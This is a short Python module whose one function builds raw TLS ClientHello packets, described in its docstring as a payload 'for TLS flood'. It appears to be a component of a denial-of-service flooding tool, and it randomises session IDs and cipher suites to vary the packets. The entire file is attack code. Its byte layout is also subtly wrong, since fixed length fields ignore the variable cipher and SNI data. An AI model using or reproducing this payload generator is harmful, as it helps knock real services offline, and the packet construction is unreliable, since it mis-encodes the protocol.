import os
import random

def generate_payload(target, options=None):
    """
    TLS ClientHello handshake packet for TLS flood.
    options:
      - sni: str, server name indication (default: target)
      - randomize: bool, randomize session id and ciphers
    """
    sni = options.get('sni', target) if options else target
    randomize = options.get('randomize', True) if options else True
    session_id = os.urandom(32) if randomize else b'\x00'*32
    ciphers = b''.join([b'\x00' + bytes([random.randint(1,255)]) for _ in range(30)]) if randomize else b'\x00\x2f\x00\x35\x00\x0a'
    # Minimal TLS 1.2 ClientHello with SNI extension
    client_hello = (
        b'\x16\x03\x01\x00\xdc'  # TLS record header
        b'\x01\x00\x00\xd8\x03\x03' + os.urandom(32) +  # ClientHello
        b'\x00\x20' + session_id +  # Session ID
        b'\x00' + bytes([len(ciphers)]) + ciphers +  # Cipher suites
        b'\x01\x00'  # Compression methods
        b'\x00\x81'  # Extensions length
        b'\x00\x00'  # SNI extension type
        + bytes([0, len(sni)+5]) + b'\x00\x03' + bytes([0, len(sni)]) + sni.encode()
        + b'\x00\x0a\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19'
        + b'\x00\x23\x00\x00'
        + b'\x00\x0d\x00\x12\x00\x10\x05\x01\x05\x03\x05\x02\x06\x01\x06\x03\x06\x02\x04\x01\x04\x03\x04\x02'
        + b'\x00\x05\x00\x05\x01\x00\x00\x00'
    )
    return client_hello
